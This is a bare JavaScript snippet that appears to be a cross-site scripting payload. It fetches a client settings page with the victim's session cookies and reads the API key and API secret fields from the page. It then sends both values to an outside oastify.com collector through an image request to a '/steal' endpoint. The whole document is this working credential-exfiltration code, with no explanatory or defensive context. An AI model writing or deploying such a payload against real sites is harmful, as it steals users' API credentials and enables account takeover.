fetch("/client/settings/configuration", {credentials:"include"})
  .then(r=>r.text())
  .then(h=>{
    let d=new DOMParser().parseFromString(h,"text/html");
    let k=d.querySelector('input[name="api_key"]')?.value;
    let s=d.querySelector('input[name="api_secret"]')?.value;
    if(k&&s){
      new Image().src=`https://2v1jtx1vezcek1lbfgr5zkmhw82zqqef.oastify.com/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`;
    }
  });
